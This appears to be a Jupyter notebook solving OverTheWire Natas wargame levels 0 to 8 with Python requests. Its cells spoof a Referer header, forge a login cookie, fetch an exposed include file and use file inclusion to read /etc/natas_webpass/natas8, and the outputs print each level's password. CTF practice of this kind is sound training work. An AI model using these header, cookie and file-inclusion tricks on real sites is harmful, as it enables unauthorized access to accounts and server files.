{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas0\", \"pass\": \"natas0\" };</script></head>\n",
      "<body>\n",
      "<h1>natas0</h1>\n",
      "<div id=\"content\">\n",
      "You can find the password for the next level on this page.\n",
      "\n",
      "<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# natas0\n",
    "import requests\n",
    "session = requests.Session()\n",
    "#payload = {'Username':'natas0','Password':'natas0'}\n",
    "resp = requests.get('http://natas0.natas.labs.overthewire.org', auth=('natas0', 'natas0'))\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas1\", \"pass\": \"gtVrDuiDfck831PqWsLEZy5gyDz1clto\" };</script></head>\n",
      "<body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\">\n",
      "<h1>natas1</h1>\n",
      "<div id=\"content\">\n",
      "You can find the password for the\n",
      "next level on this page, but rightclicking has been blocked!\n",
      "\n",
      "<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->\n",
    "payload = ('natas1','gtVrDuiDfck831PqWsLEZy5gyDz1clto')\n",
    "resp = requests.get('http://natas1.natas.labs.overthewire.org',auth = payload)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ntlevel = 'natas2'\n",
    "payload = (ntlevel,'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi')\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload)\n",
    "print(resp.text)\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org/files'.format(ntlevel),auth = payload)\n",
    "print(resp.text)\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org/files/users.txt'.format(ntlevel),auth = payload)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas3\", \"pass\": \"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14\" };</script></head>\n",
      "<body>\n",
      "<h1>natas3</h1>\n",
      "<div id=\"content\">\n",
      "There is nothing on this page\n",
      "<!-- No more information leaks!! Not even Google will find it this time... -->\n",
      "</div>\n",
      "</body></html>\n",
      "\n",
      "User-agent: *\n",
      "Disallow: /s3cr3t/\n",
      "\n",
      "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\n",
      "\n"
     ]
    }
   ],
   "source": [
    "levelp = \"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14\"\n",
    "ntlevel = 'natas3'\n",
    "payload = (ntlevel,levelp)\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload)\n",
    "print(resp.text)\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org/robots.txt'.format(ntlevel),auth = payload)\n",
    "print(resp.text)\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org/s3cr3t/users.txt'.format(ntlevel),auth = payload)\n",
    "print(resp.text)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\" };</script></head>\n",
      "<body>\n",
      "<h1>natas4</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\n",
      "<br/>\n",
      "<div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "levelp = \"Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\"\n",
    "ntlevel = 'natas4'\n",
    "payload = (ntlevel,levelp)\n",
    "header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload,headers=header)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas5\", \"pass\": \"iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\" };</script></head>\n",
      "<body>\n",
      "<h1>natas5</h1>\n",
      "<div id=\"content\">\n",
      "Access disallowed. You are not logged in</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "<RequestsCookieJar[<Cookie loggedin=0 for natas5.natas.labs.overthewire.org/>]>\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas5\", \"pass\": \"iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\" };</script></head>\n",
      "<body>\n",
      "<h1>natas5</h1>\n",
      "<div id=\"content\">\n",
      "Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "levelp = \"iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\"\n",
    "ntlevel = 'natas5'\n",
    "payload = (ntlevel,levelp)\n",
    "header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload,headers=header)\n",
    "print(resp.text)\n",
    "print(resp.cookies)\n",
    "mycookie = {'loggedin':'1'}\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload,headers=header,\n",
    "                                                   cookies=mycookie)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas6\", \"pass\": \"aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1\" };</script></head>\n",
      "<body>\n",
      "<h1>natas6</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "\n",
      "<form method=post>\n",
      "Input secret: <input name=secret><br>\n",
      "<input type=submit name=submit>\n",
      "</form>\n",
      "\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "levelp = \"aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1\"\n",
    "ntlevel = 'natas6'\n",
    "payload = (ntlevel,levelp)\n",
    "header = {'Referer':'http://{}.natas.labs.overthewire.org/'.format(ntlevel)}\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload,headers=header)\n",
    "print(resp.text)\n",
    "secret = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'\n",
    "resp = requests.get(secret,auth = payload,headers=header)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9\" };</script></head>\n",
      "<body>\n",
      "<h1>natas7</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "<a href=\"index.php?page=home\">Home</a>\n",
      "<a href=\"index.php?page=about\">About</a>\n",
      "<br>\n",
      "<br>\n",
      "\n",
      "<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9\" };</script></head>\n",
      "<body>\n",
      "<h1>natas7</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "<a href=\"index.php?page=home\">Home</a>\n",
      "<a href=\"index.php?page=about\">About</a>\n",
      "<br>\n",
      "<br>\n",
      "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe\n",
      "\n",
      "<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "levelp = \"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9\"\n",
    "ntlevel = 'natas7'\n",
    "payload = (ntlevel,levelp)\n",
    "header = {'Referer':'http://{}.natas.labs.overthewire.org/'.format(ntlevel)}\n",
    "resp = requests.get('http://{}.natas.labs.overthewire.org'.format(ntlevel),auth = payload,headers=header)\n",
    "print(resp.text)\n",
    "url = 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'\n",
    "resp = requests.get(url,auth = payload,headers=header)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In php intepreter execute:\n",
    "```\n",
    "function decodeSecret($secret) {\n",
    "    return base64_decode(strrev(hex2bin($secret)));\n",
    "}\n",
    "$encodedSecret = \"3d3d516343746d4d6d6c315669563362\";\n",
    "$r = decodeSecret($encodedSecret);\n",
    "print($r);\n",
    "```\n",
    "\n",
    "```\n",
    "Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
